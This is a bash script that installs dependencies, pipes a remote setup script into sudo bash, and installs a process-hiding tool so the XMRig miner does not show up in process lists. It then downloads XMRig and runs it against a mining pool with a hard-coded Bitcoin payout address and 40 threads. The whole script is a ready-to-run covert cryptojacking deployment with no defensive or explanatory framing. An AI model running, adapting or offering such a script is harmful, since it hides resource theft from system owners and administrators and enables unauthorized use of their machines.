#!/bin/bash
#!/bin/sh
#!/bin/bash

apt-get update && apt-get full-upgrade
apt -y install wget curl unzip screen autoconf git cmake binutils build-essential net-tools golang
sudo curl -fsSL https://deb.nodesource.com/setup_12.x | sudo -E bash - 
apt-get install -y nodejs 
npm i -g node-process-hider && sudo ph add xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar -xzvf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
chmod +x xmrig
ph add xmrig

./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:1NPgcV7FomPoZNuPQKQ1bLFZHhzCAYNEiS.$(echo $(shuf -i 1-999 -n 1)-CPU) -p 2 -t 40
